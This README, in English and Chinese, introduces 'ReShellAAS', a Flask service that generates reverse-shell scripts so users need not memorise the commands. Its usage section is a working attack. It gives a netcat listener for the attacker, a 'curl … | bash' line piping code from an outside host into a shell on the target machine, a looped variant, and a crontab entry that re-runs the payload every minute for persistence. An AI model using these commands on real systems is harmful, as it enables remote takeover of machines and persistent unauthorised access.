# ReShellAAS
Reverse Shell as a Service
反弹shell即服务

# 项目简介
无需再去记住复杂的反弹shell命令，通过Reverse Shell as a Service可以方便、快捷的创建反弹shell脚本。

# 安装及服务端启动方法
```
pip3 install flask
python3 app.py
```

# 使用方法
## Attacker Machine
```
nc -l 1337
```

## Target Machine
```
curl http://reshell.tk/ip/1337 | bash
或者
while true; do curl http://reshell.tk/ip/1337 | bash; done
```
配合crontab使用效果更佳
```
crontab -e
* * * * * /usr/bin/curl http://reshell.tk/ip/1337 | bash
```

# 致谢
感谢P师傅以及P师傅的知识星球以及原创这个点子的小机灵鬼。

# TODO
- 适应多场景的反弹shell语法
- etc...

